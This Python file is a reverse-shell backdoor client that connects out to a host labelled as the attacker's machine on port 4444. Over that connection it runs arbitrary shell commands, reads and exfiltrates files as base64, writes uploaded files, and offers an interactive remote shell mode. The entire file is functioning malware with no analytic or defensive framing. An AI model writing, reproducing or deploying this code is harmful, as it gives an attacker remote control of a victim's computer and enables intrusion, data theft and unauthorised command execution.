import socket
import subprocess
import os
import json
import base64

# Set up the target server and port (attacker's machine)
HOST = "10.0.1.37"  # Replace with the attacker's IP address
PORT = 4444  # Replace with the port the attacker is listening on

# Function to execute commands on the target machine
def execute_command(command):
    return subprocess.run(command, shell=True, capture_output=True)

def send_json(sock, data):
    json_data = json.dumps(data)  # Convert Python object to JSON string
    sock.send(json_data.encode())  # Send encoded JSON string

def recieve_json(sock):
    json_data = ""
    while True:
        try:
            json_data += sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def read_file(path):
    try:
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()
    except FileNotFoundError:
        return f"[-] File not found: {path}"
    except PermissionError:
        return f"[-] Permission denied: {path}"
    except Exception as e:
        return f"[-] Error reading file {path}: {str(e)}"

def write_file(path, content):
    try:
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful [+]"
    except PermissionError:
        return f"[-] Permission denied: {path}"
    except Exception as e:
        return f"[-] Error writing file {path}: {str(e)}"

# Create a socket object to connect back to the attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect((HOST, PORT))
    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))

    default_prompt = "admin@medusax~$ "
    current_prompt = default_prompt
    in_shell_mode = False

    while True:
        sock.sendall(current_prompt.encode("utf-8"))
        command = recieve_json(sock)

        if command[0].lower() == "km":
            sock.sendall("Disconnecting...\n".encode("utf-8"))
            sock.close()
            break

        if command[0].lower() == "shell":
            try:
                os.chdir("C:\\")
                in_shell_mode = True
                current_prompt = f"{os.getcwd()} > "
                sock.sendall("Entering remote shell mode. Type 'exit' to leave.\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to switch to C:\\: {e}\n".encode("utf-8"))
            continue

        if command[0] == "shell" and len(command) > 1 and command[1] == "-d":
            try:
                directory = command[2].strip()
                os.chdir(directory)
                in_shell_mode = True
                current_prompt = f"{os.getcwd()} > "
                sock.sendall(f"Changed directory to {directory}\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to change directory: {e}\n".encode("utf-8"))
            continue

        elif command[0] == "download":
            result = read_file(command[1])
        elif command[0] == "upload":
            result = write_file(command[1], command[2])
        else:
            output = execute_command(" ".join(command))
            result = (output.stdout + output.stderr).decode(errors="ignore")

        send_json(sock, result)

except Exception as e:
    print(f"Error: {e}")
    sock.close()
